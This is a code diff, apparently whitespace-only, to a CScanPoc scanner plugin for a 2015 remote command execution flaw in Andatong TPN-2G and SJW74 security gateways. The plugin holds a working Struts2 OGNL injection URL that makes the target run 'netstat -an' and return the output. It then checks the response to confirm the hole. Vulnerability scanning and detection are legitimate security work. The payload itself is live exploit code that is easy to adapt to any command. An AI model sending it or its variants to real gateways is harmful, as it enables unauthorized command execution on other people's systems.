@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'ADTsec_0002'  # 平台漏洞编号，留空
     name = '安达通安全网关 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-08-04'  # 漏洞公布时间
     desc = '''
         “全网行为管理TPN-2G安全网关产品”和“SJW74系列安全网关” 存在一处远程命令执行。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '安达通安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '788c7812-5c8f-466d-b1fd-1b72d7f6f417'
@@ -32,13 +34,13 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #info:http://www.wooyun.org/bugs/wooyun-2015-0131408
+            # info:http://www.wooyun.org/bugs/wooyun-2015-0131408
             hh = hackhttp.hackhttp()
             arg = self.target
             url = arg + '/lan/admin_getLisence?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22netstat%22,%22-an%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()}%22%3Etest.action?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22netstat%22,%22-an%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java'
             code, head, res, errcode, _ = hh.http(url)
 
-            if code==200 and 'Active Internet connections' in res:
+            if code == 200 and 'Active Internet connections' in res:
                 #security_hole('Arbitrary command execution'+url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -48,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
